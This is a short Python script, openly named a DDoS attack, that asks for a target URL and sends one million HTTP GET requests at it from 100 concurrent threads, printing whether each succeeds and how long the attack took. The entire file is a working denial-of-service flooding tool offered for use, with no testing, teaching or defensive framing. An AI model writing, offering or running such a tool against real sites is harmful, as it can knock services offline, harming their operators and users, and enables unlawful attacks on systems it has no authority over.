import requests
import concurrent.futures
import time

def send_request(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Request to {url} succeeded")
        else:
            print(f"Request to {url} failed with status code {response.status_code}")
    except requests.RequestException as e:
        print(f"Request to {url} failed with exception {e}")

def ddos_attack(target_url, num_requests):
    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request, target_url) for _ in range(num_requests)]
        concurrent.futures.wait(futures)
    end_time = time.time()
    print(f"DDOS attack completed in {end_time - start_time} seconds")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    num_requests = 1000000
    ddos_attack(target_url, num_requests)